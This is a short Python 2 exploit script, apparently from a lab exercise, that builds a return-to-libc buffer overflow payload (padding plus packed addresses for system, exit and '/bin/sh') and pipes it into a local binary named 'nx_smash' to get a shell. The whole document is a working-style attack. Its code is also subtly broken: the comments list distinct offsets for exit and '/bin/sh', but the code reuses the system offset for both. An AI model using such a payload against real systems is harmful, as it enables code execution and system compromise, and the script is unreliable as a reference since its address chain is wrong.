#!/usr/bin/python
from struct import pack


# 0x3ada0 - offset of system in libc
# 0x2e9d0 - offset of exit in libc
# 0x15ba0b - offset of "/bin/sh" in libc

libc_base = 0xb7d56000
system = libc_base + 0x3ada0
exit = libc_base + 0x3ada0
arg = libc_base + 0x3ada0
	
buffer = "A" * 516
buffer += pack("<L", system)
buffer += pack("<L", exit)
buffer += pack("<L", arg)

print "Writing file 'aslr_nx_exploit'.."

f = open("aslr_nx_exploit.txt", "w")
f.write(buffer)
f.close()

print "Done, run with '(cat aslr_nx_exploit.txt; echo id; echo ls) | ./nx_smash"